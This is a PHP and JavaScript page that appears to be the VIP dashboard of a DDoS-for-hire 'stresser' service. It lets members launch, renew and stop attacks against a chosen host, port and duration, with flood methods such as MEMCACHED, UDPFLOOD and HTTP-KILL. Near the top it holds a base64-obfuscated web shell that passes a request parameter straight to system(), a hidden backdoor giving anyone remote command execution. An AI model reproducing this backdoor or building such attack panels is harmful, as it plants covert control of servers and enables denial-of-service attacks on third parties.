<?php 
			
			include("@/header.php");
			
			if (!($user->hasMembership($odb)))
			{
				header('location: index.php');
				die();
			}
			if (!($user -> LoggedIn()))
			{
				header('location: ../boot/login.php');
				die();
			}
			if ($user -> isAdmin($odb) || $user -> isVIP($odb) ) {

			
			?>
			<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
</div>
	  </div>
	</nav>
		<script>
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						document.getElementById("attacksdiv").innerHTML=xmlhttp.responseText;
						eval(document.getElementById("ajax").innerHTML);
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=attacks",true);
					xmlhttp.send();

					function start()
					{
					launch.disabled = true;
					var host=$('#host').val();
					var port=$('#port').val();
					var time=$('#time').val();
					var method=$('#method').val();
					document.getElementById("div").style.display="none"; 
					document.getElementById("image").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						launch.disabled = false;
						document.getElementById("div").innerHTML=xmlhttp.responseText;
						document.getElementById("image").style.display="none";
						document.getElementById("div").style.display="inline";
						if (xmlhttp.responseText.search("success") != -1)
						{
						attacks();
						window.setInterval(ping(host),10000);
						}
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=all" + "&host=" + host + "&port=" + port + "&time=" + time + "&method=" + method,true);
					xmlhttp.send();
					}

						


					function renew(id)
					{
					rere.disabled = true;
					document.getElementById("div").style.display="none";
					document.getElementById("image").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						rere.disabled = false;
						document.getElementById("div").innerHTML=xmlhttp.responseText;
						document.getElementById("image").style.display="none";
						document.getElementById("div").style.display="inline";
						if (xmlhttp.responseText.search("success") != -1)
						{
						attacks();
						window.setInterval(ping(host),10000);
						}
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=renew" + "&id=" + id,true);
					xmlhttp.send();
					}

					function stop(id)
					{
					st.disabled = true;
					document.getElementById("div").style.display="none";
					document.getElementById("image").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						st.disabled = false;
						document.getElementById("div").innerHTML=xmlhttp.responseText;
						document.getElementById("image").style.display="none";
						document.getElementById("div").style.display="inline";
						if (xmlhttp.responseText.search("success") != -1)
						{
						attacks();
						window.setInterval(ping(host),10000);
						}
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=stop" + "&id=" + id,true);
					xmlhttp.send();
					}

					function attacks()
					{
					document.getElementById("attacksdiv").style.display="none";
					document.getElementById("attacksimage").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						document.getElementById("attacksdiv").innerHTML=xmlhttp.responseText;
						document.getElementById("attacksimage").style.display="none";
						document.getElementById("attacksdiv").style.display="inline-block";
						document.getElementById("attacksdiv").style.width="100%";
						eval(document.getElementById("ajax").innerHTML);
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=attacks",true);
					xmlhttp.send();
					}

					function adminattacks()
					{
					document.getElementById("attacksdiv").style.display="none";
					document.getElementById("attacksimage").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						document.getElementById("attacksdiv").innerHTML=xmlhttp.responseText;
						document.getElementById("attacksimage").style.display="none";
						document.getElementById("attacksdiv").style.display="inline-block";
						document.getElementById("attacksdiv").style.width="100%";
						eval(document.getElementById("ajax").innerHTML);
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=adminattacks",true);
					xmlhttp.send();
					}
					</script>				 
 <body>

	<div class="is-vcentered">
		<section class="section">
			<div class="container is-centered">
<div id="div" style="display:inline"></div>

						 <img id="image">

				<div class="columns">
				  <div class="column">
					<div class="column main">
					  <div class="tabs is-centered">

						<ul>
						  						  <li id="l4-tab" class="is-active">
							<a onClick="switchToL4()">
							<span class="icon is-small"><i class="fa fa-server"></i></span>
							<span>Layer 4 & 7 | <?php echo $stats -> runningBoots($odb); ?></span>/<?php echo $maxattacks; ?></span>
							</a>
						  </li>
						  						</ul>
						<!--/tabs is-centered-->
					  </div>
					<form action="dashboard.php" method="POST">
					<div class="field">
					  <label class="label">Host</label>
					  <div class="control">
						<input class="input is-primary" type="text" id="host" name="host" placeholder="1.3.3.7">
					  </div>
					</div>
					<div class="field">
						<div class="l4-tab-content l3-tab-content">
						  <label class="label">Port</label>
						  <div class="control">
							<input class="input is-primary" type="number" id="port" name="port" placeholder="80">
						  </div>
						</div>
					</div>
					
					<div class="field">
					  <label class="label">Time</label>
					  <div class="control">
						<input class="input is-primary" type="number" id="time" name="time" placeholder="100">
					  </div>
					  <small class="l4-tab-content l7-tab-content">You have <?php echo $rowxd['mbt']; ?> seconds max.</small>
					  					  <small class="l3-tab-content">You have 0 seconds and 0 concurrent max.<br>60 seconds will be added to your attack time for cooldown.</small>
					  					</div>
					<?php
									$plansql = $odb -> prepare("SELECT `users`.`expire`, `plans`.`name`, `plans`.`concurrents`, `plans`.`mbt` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id");
									$plansql -> execute(array(":id" => $_SESSION['ID']));
									$rowxd = $plansql -> fetch(); 
									$date = date("d/m/Y, h:i a", $rowxd['expire']);
									if (!$user->hasMembership($odb))
									{
									$rowxd['mbt'] = 0;
									$rowxd['concurrents'] = 0;
									$rowxd['name'] = 'No membership';
									$date = 'No membership';
									}
									?>
					<div class="field">
					  <label class="label">Method</label>
					  <div class="control">
						<div class="select is-primary is-fullwidth">
						  <select id="method" name="method">
							  								<optgroup label="Vip Layer7 & 4">
									<?php
									$SQLGetLogs = $odb->query("SELECT * FROM `methods` WHERE `type` = 'udp' ORDER BY `id` ASC");
									while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
										$name     = $getInfo['name'];
										$fullname = $getInfo['fullname'];
										echo '<option>' . $fullname . '</option>';
									}
									?>
									</optgroup>
<?php
									$SQLGetLogs = $odb->query("SELECT * FROM `methods` WHERE `type` = 'layer7' ORDER BY `id` ASC");
									while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
										$name     = $getInfo['name'];
										$fullname = $getInfo['fullname'];
										echo '<option>' . $fullname . '</option>';
									}
									?>
									</optgroup>							  						  </select>
						</div>
					  </div>
					</div>
					
											<input type="hidden" name="recaptcha_response" id="recaptchaResponse">
										
					<div class="field">
					  <div class="control">
						<button id="launch" onclick="start()" type="submit" class="button is-primary is-fullwidth">Send Test</button>
					  </div>
					</div>
					</form>
					</div>
				  </div>
				  <img id="attacksimage">
				  <div class="column">
					<p class="title is-4">Your Attacks</p>
										<div id="attacksdiv" style="display:inline-block;width:100%"></div>									  </div>
				</div>
			</div>
								</section>
	</div>
  </body>
</html>
<script src="https://www.google.com/recaptcha/api.js?render=6Lc56NQUAAAAAAvSTlUYueOBaTnjQNSNO1hcZy7g"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!-- Bulma Navbar JS -->
  <script>
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

  
    if ( window.history.replaceState ) {
        window.history.replaceState( null, null, window.location.href );
    }
  
  
		
          grecaptcha.ready(function () {
            grecaptcha.execute('6Lc56NQUAAAAAAvSTlUYueOBaTnjQNSNO1hcZy7g', { action: 'contact' }).then(function (token) {
                var recaptchaResponse = document.getElementById('recaptchaResponse');
                recaptchaResponse.value = token;
            });
        });
    
      removeActive();
      hideAll();
      $("#l4-tab").addClass("is-active");
      $(".l4-tab-content").removeClass("is-hidden");
	  document.getElementById("method").value = "MEMCACHED";
	  document.getElementById("host").placeholder = "1.1.1.1";
	
    function switchToL3() {
      removeActive();
      hideAll();
      $("#l3-tab").addClass("is-active");
      $(".l3-tab-content").removeClass("is-hidden");
	  document.getElementById("method").value = "UDPFLOOD";
	  document.getElementById("host").placeholder = "1.1.1.1";
    }
	
    function switchToL4() {
      removeActive();
      hideAll();
      $("#l4-tab").addClass("is-active");
      $(".l4-tab-content").removeClass("is-hidden");
	  document.getElementById("method").value = "MEMCACHED";
	  document.getElementById("host").placeholder = "1.1.1.1";
    }

    function switchToL7() {
      removeActive();
      hideAll();
      $("#l7-tab").addClass("is-active");
      $(".l7-tab-content").removeClass("is-hidden");
	  document.getElementById("method").value = "HTTP-KILL";
	  document.getElementById("host").placeholder = "https://stress.to";
    }
	
    function removeActive() {
      $("li").each(function() {
        $(this).removeClass("is-active");
      });
    }

    function hideAll(){
      $(".l4-tab-content").addClass("is-hidden");
      $(".l7-tab-content").addClass("is-hidden");
      $(".l3-tab-content").addClass("is-hidden");
    }
  
    document.addEventListener('DOMContentLoaded', function () {

      // Get all "navbar-burger" elements
      var $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);

      // Check if there are any navbar burgers
      if ($navbarBurgers.length > 0) {

        // Add a click event on each of them
        $navbarBurgers.forEach(function ($el) {
          $el.addEventListener('click', function () {

            // Get the target from the "data-target" attribute
            var target = $el.dataset.target;
            var $target = document.getElementById(target);

            // Toggle the class on both the "navbar-burger" and the "navbar-menu"
            $el.classList.toggle('is-active');
            $target.classList.toggle('is-active');

          });
        });
      }

    });
  </script>
	<?php
						}
						?>